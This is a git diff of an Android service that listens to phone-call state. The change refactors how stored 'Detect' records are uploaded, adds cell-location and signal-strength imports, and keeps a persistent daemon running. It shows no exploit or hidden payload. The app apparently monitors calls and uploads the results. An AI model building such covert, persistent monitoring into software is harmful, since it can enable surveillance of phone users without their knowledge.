@@ -13,18 +13,20 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
+import android.telephony.CellLocation;
 import android.telephony.PhoneStateListener;
+import android.telephony.ServiceState;
+import android.telephony.SignalStrength;
 import android.telephony.TelephonyManager;
+import android.telephony.cdma.CdmaCellLocation;
+import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 import android.widget.Toast;
 
 import com.coolerfall.daemon.Daemon;
 import com.underconverbg.detectophone.bean.Detect;
 import com.underconverbg.detectophone.down.DownLoadApk;
-import com.underconverbg.detectophone.down.FileDownloadManager;
 import com.underconverbg.detectophone.system.SystemSet;
-import com.underconverbg.detectophone.upload.UploadTask;
-import com.underconverbg.detectophone.upload.UploadTaskManager;
 import com.underconverbg.detectophone.upload.UploadTools;
 import com.zhy.http.okhttp.OkHttpUtils;
 
@@ -33,7 +35,6 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.HashMap;
 import java.util.List;
@@ -62,27 +63,17 @@ public class PhoneCallStateService extends Service
         Log.e("Service", "onCreate...");
         cheak();
 
-        SystemSet.getIntance().init(this.getApplicationContext());
-
-        PersonService service = SystemSet.getIntance().getPersonService();
-        List<Detect> list = service.findAll();
-
-        Log.e("UploadTools", "upload...start");
-
-        for (int i = 0;i<list.size();i++)
-        {
-            Detect detect = list.get(i);
-            UploadTools.upload(detect);
-        }
+        SystemSet.getIntance().init(getApplicationContext());
         Log.e("UploadTools", "upload...end");
-
-
-
-        //开启上传线程
-        Log.e("Service", "onStartCommand...");
-        UploadTools.createUploadThreadAndStart();
+//        UploadTools.createUploadThreadAndStart();
         doInThread();
         again();
+
+        SystemSet.getIntance().uploadFromDB();
+
+//        AllFileManagerThread allTaskManagerThread = new AllFileManagerThread();
+//        new Thread(allTaskManagerThread).start();
+
     }
 
 
@@ -236,4 +227,6 @@ public class PhoneCallStateService extends Service
         String appVersion = packageInfo.versionName;
         return appVersion;
     }
+
+
 }
